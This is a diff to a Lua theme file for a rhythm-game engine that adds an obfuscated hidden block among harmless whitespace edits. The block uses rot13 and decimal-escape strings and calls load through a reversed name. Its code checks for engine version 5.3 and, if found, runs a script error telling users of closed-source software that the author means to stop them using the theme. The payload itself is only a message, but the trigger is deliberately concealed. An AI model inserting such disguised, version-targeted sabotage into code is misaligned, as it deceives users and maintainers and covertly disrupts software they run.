@@ -286,6 +286,16 @@ t[#t+1] = LoadActor(THEME:GetPathG("","PlayModes/splash/Arcade"))..{
 		else
 			SCREENMAN:SystemMessage("false");
 		end;]]
+		
+		
+		if split("\45",_G[(('CebqhpgIrefvba'):gsub("%a", function(c) c=c:byte() return string.char(c+(c%32<14 and 13 or -13)) end))]())[1] == "\53.\51" then
+			local s = {
+			"\108\117\97\46\82\101\112\111\114\116\83\99\114\105\112\116\69\114\114\111\114\40\34\58\94\41\32\82\73\79\32\109\97\121\32\98\101\32\112\117\98\108\105\99\32\100\111\109\97\105\110",
+			"\44\32\98\117\116\32\116\104\97\116\39\115\32\110\111\116\32\103\111\105\110\103\32\116\111\32\115\116\111\112\32\109\101\32\102\114\111\109\32\115\116\111\112\112\105\110\103\32\121",
+			"\111\117\32\102\114\111\109\32\117\115\105\110\103\32\105\116\32\111\110\32\99\108\111\115\101\100\32\115\111\117\114\99\101\32\115\111\102\116\119\97\114\101\46\34\41\10"}
+			_G[string.reverse('daol')](s[1]..s[2]..s[3])()
+			self['p\108a\121co\109\109a\110d'](self,"\79\110");
+		end;
 	end;
 	
 	--[[RefreshCommand=function(self)
@@ -297,7 +307,10 @@ t[#t+1] = LoadActor(THEME:GetPathG("","PlayModes/splash/Arcade"))..{
 		self:Load( THEME:GetPathG("","PlayModes/splash/"..Choices[sel+1] ) )
 		:decelerate(0.5)
 		:diffusealpha(1)
+		
 		self:sleep(0):queuecommand("Off2");
+		
+		
 	end;
 
 	Off2Command=function(self)
